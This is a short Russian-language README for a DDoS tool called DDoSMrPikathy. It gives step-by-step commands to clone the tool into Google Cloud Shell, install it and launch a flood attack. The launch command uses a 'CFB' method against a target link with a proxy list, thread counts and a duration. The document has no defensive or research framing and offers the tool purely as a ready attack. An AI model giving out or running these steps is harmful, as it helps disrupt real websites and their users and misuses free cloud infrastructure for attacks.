# DDoSMrPikathy
Для работы данного скрипта вам нужно будет перейти на бесплатный SHELL.
- https://shell.cloud.google.com

Написать следующие команды:

- git clone https://github.com/MrPikathy/DDoSMrPikathy.git
- ls
- cd DDoSMrPikathy
- pip3 install -r requirements.txt
- python3 start.py

Запуск ддоса:

- python3 start.py CFB Ссылка 1 1000 http.txt 1000 1000
